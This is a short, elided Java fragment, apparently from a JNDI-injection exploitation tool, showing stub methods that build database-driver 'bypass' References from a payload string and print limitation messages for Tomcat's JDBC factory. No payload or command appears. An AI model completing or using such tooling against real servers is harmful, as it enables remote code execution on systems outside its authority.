...
abstract class DBFactory {
	...
	public static Reference sqlitebypass2(String payload){
		if ( factory.equals("org.apache.tomcat.jdbc.pool.DataSourceFactory") ) {
			System.out.println("[*]TomcatJdbcFactory only execute one line of SQL, can not sqlitebypass2");
		}
	...
	public static Reference derbybypass(String payload){
		if ( factory.equals("org.apache.tomcat.jdbc.pool.DataSourceFactory") ) {
			System.out.println("[*]TomcatJdbcFactory only execute one line of SQL, can not derbybypass");
			return null;
		}
